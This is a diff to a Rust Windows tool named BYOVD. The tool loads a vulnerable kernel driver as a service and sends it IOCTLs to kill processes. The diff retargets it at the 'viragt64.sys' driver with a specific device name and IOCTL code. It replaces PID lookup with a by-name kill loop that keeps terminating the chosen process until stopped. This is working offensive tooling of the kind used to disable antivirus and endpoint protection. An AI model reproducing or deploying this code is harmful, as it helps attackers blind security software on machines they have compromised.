@@ -1,30 +1,34 @@
 #![allow(non_snake_case,non_camel_case_types, dead_code)]
 
-
 extern crate winapi;
+
+
 use clap::{App, Arg};
 use ctrlc;
-use std::ffi::{CString, OsStr, CStr};
+
+use std::ffi::{CString, OsStr};
 use std::marker::PhantomData;
-use std::mem::{self};
+use std::mem;
 use std::os::windows::ffi::OsStrExt;
 use std::ptr::{null};
-use std::sync::Arc;
-use std::sync::atomic::{AtomicBool, Ordering};
+use std::sync::{Arc, atomic::{AtomicBool, Ordering}};
 use std::thread::sleep;
 use std::time::Duration;
-use winapi::shared::minwindef::{DWORD};
-use winapi::shared::ntdef::NULL;
-use winapi::shared::winerror::NO_ERROR;
-use winapi::um::fileapi::{CreateFileW, OPEN_EXISTING};
-use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
-use winapi::um::ioapiset::DeviceIoControl;
-use winapi::um::processenv::GetCurrentDirectoryW;
-use winapi::um::tlhelp32::{CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS};
-use winapi::um::winnt::{SERVICE_AUTO_START, HANDLE};
-use winapi::um::winnt::{SERVICE_ERROR_NORMAL, SERVICE_KERNEL_DRIVER, SERVICE_WIN32_OWN_PROCESS};
-use winapi::um::winsvc::{CloseServiceHandle, ControlService, SERVICE_STOPPED, CreateServiceW, DeleteService, OpenSCManagerA, OpenSCManagerW, OpenServiceA, OpenServiceW, SC_HANDLE, SC_MANAGER_CREATE_SERVICE, SERVICE_ALL_ACCESS, SERVICE_CONTROL_STOP, SERVICE_STATUS, StartServiceA};
-use winapi::shared::minwindef::LPVOID;
+use winapi::shared::{
+    minwindef::{DWORD, LPVOID},
+    ntdef::NULL,
+    winerror::NO_ERROR,
+};
+use winapi::um::{
+    fileapi::{CreateFileW, OPEN_EXISTING},
+    handleapi::{CloseHandle, INVALID_HANDLE_VALUE},
+    ioapiset::DeviceIoControl,
+    processenv::GetCurrentDirectoryW,
+    winnt::{SERVICE_AUTO_START, HANDLE, SERVICE_ERROR_NORMAL, SERVICE_KERNEL_DRIVER, SERVICE_WIN32_OWN_PROCESS},
+    winsvc::{CloseServiceHandle, ControlService, SERVICE_STOPPED, CreateServiceW, DeleteService, OpenSCManagerA, OpenSCManagerW, OpenServiceA, OpenServiceW, 
+            SC_HANDLE, SC_MANAGER_CREATE_SERVICE, SERVICE_ALL_ACCESS, SERVICE_CONTROL_STOP, SERVICE_STATUS, StartServiceA},
+};
+use std::os::raw::c_char;
 
 const MAX_PATH: usize = 260;
 
@@ -38,23 +42,37 @@ trait Driver {
     fn driver_path() -> &'static str;
     fn device_name() -> &'static str;
     fn ioctl_code() -> DWORD;
-    fn create_ioctl_struct(pid: DWORD) -> Self::IoctlStruct;
+    fn create_ioctl_struct(process_name: &str) -> Self::IoctlStruct; 
 }
 
 
 #[repr(C, packed)]
 struct BYOVD_TEMPLATEIoctlStruct {
-    padding: [u8; 4],  
-    pid: DWORD,        
-    extra_padding: [u8; 16], 
+    process_name: [c_char; 256], 
 }
 
 impl BYOVD_TEMPLATEIoctlStruct {
-    fn new(pid: DWORD) -> Self {
+    fn new(process_name: &str) -> Self {
+        let mut name_buffer = [0 as c_char; 256]; 
+
+        
+        let truncated_name = if process_name.len() >= 255 {
+            &process_name[..255]
+        } else {
+            process_name
+        };
+
+        
+        for (i, &byte) in truncated_name.as_bytes().iter().enumerate() {
+            name_buffer[i] = byte as c_char;
+        }
+
+        
+        
+        name_buffer[255] = 0 as c_char;
+
         Self {
-            padding: [0; 4],
-            pid,
-            extra_padding: [0; 16],
+            process_name: name_buffer,
         }
     }
 }
@@ -64,23 +82,23 @@ impl Driver for BYOVD_TEMPLATE {
     type IoctlStruct = BYOVD_TEMPLATEIoctlStruct;
 
     fn driver_name() -> &'static str {
-        "SysMon"
+        "viragt64"
     }
 
     fn driver_path() -> &'static str {
-        "\\sysmon.sys"
+        "\\viragt64.sys"
     }
 
     fn device_name() -> &'static str {
-        "\\\\.\\TfSysMon"  
+        "\\\\.\\viragtlt"  
     }
 
     fn ioctl_code() -> DWORD {
-        0xB4A00404  
+        0x82730030  
     }
 
-    fn create_ioctl_struct(pid: DWORD) -> Self::IoctlStruct {
-        BYOVD_TEMPLATEIoctlStruct::new(pid)
+    fn create_ioctl_struct(process_name: &str) -> Self::IoctlStruct {
+        BYOVD_TEMPLATEIoctlStruct::new(process_name)
     }
 }
 
@@ -283,8 +301,9 @@ impl<D: Driver> BYOVD<D> {
         true
     }
 
-    fn kill_process_by_pid(&self, dw_pid: DWORD) {
-        let mut driver_ioctl = D::create_ioctl_struct(dw_pid);
+
+    fn kill_process_by_name(&self, process_name: &str) {
+        let mut driver_ioctl = D::create_ioctl_struct(process_name);
 
         let h_driver: HANDLE = unsafe {
             CreateFileW(
@@ -299,7 +318,7 @@ impl<D: Driver> BYOVD<D> {
         };
 
         if h_driver == INVALID_HANDLE_VALUE {
-            println!("Failed to open driver file.");
+            println!("[X] Failed to open driver file.");
             return;
         }
 
@@ -320,15 +339,15 @@ impl<D: Driver> BYOVD<D> {
         };
 
         if ioctl_result == 0 {
-            println!("Failed to send IOCTL.");
+            println!("[X] Failed to send IOCTL.");
         }
 
         unsafe {
             CloseHandle(h_driver);
         }
     }
-
 }
+
 
 fn to_wstring(s: &str) -> Vec<u16> {
     OsStr::new(s)
@@ -337,9 +356,11 @@ fn to_wstring(s: &str) -> Vec<u16> {
         .collect()
 }
 
+
 fn to_string(s: &str) -> CString {
     CString::new(s).unwrap()
 }
+
 
 fn get_current_dir() -> String {
     let mut buf: Vec<u16> = vec![0; MAX_PATH];
@@ -351,39 +372,6 @@ fn get_current_dir() -> String {
     buf.truncate(len);
     String::from_utf16_lossy(&buf)
 }
-
-
-fn get_pid_by_name(process_name: &str) -> Option<DWORD> {
-    let snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) };
-
-    if snapshot == INVALID_HANDLE_VALUE {
-        return None;
-    }
-
-    let mut process_entry: PROCESSENTRY32 = unsafe { std::mem::zeroed() };
-    process_entry.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;
-
-    if unsafe { Process32First(snapshot, &mut process_entry) } == 1 {
-        loop {
-            let current_process_name = unsafe { CStr::from_ptr(process_entry.szExeFile.as_ptr()) }
-                .to_string_lossy()
-                .to_lowercase();
-
-            if current_process_name == process_name.to_lowercase() {
-                unsafe { CloseHandle(snapshot) };
-                return Some(process_entry.th32ProcessID);
-            }
-
-            if unsafe { Process32Next(snapshot, &mut process_entry) } != 1 {
-                break;
-            }
-        }
-    }
-
-    unsafe { CloseHandle(snapshot) };
-    None
-}
-
 
 
 fn main() {
@@ -416,20 +404,9 @@ fn main() {
         ctrlc::set_handler(move || {
             continue_loop_clone.store(false, Ordering::SeqCst);
         }).expect("Error setting Ctrl+C handler");
-    
-        let pid = match get_pid_by_name(process_name) {
-            Some(pid) => pid,
-            None => {
-                eprintln!("[X] Process not found");
-                return;
-            },
-        };
-        println!("[!] Killing process with PID: {}", pid);
 
-        drv.kill_process_by_pid(pid);      
-
+        println!("[!] Killing process: {}", process_name);
         println!("[!] Press Ctrl+C to stop the program.");
-
         loop {
 
             
@@ -438,21 +415,19 @@ fn main() {
                 break;
             }
 
-            let pid = match get_pid_by_name(process_name) {
-                Some(pid) => pid,
-                None => {
-                    continue; 
-                },
-            };
-            println!("[!] Killing process with PID: {}", pid);
-
-            drv.kill_process_by_pid(pid);
+            drv.kill_process_by_name(process_name);
 
         }
+        
+        
+        /*
+        This is disabled BSOD will happned if the driver will be unloaded so wired bug in the driver
         
         if drv.stop_driver() {
             println!("[!] Driver stopped !");
         }
+        */
+
     } else {
         println!("[X] Failed to initialize the driver.");
     }
